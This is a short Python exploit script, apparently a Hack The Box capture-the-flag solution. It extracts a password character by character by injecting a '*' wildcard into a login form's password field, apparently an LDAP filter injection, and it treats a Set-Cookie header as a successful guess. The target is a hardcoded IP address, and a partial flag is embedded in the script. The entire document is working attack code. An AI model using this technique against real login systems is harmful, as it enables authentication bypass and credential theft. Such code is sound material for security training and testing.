#!/usr/bin/python3

import requests

alphabet = 'HTB{}_abcdefghijklmnopqrstuvwxyz0123456789ACDEFGIJKLMNOPQRSUVWXYZ'

def step(guess: str):
    print(f'Trying: "{guess}"')

    url = "http://188.166.173.208:32738/login"
    data = f'username=reese&password={guess}*'

    r = requests.post(url, data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=False)

    if r.headers.get('Set-Cookie') is None:
        return False

    for c in alphabet:
        if step(guess + c):
            break

    else:
        print(f'Password found: {guess}')

# for c in alphabet:
#     step(c)

step('HTB{d1rectory_h4xx0r_is_k0')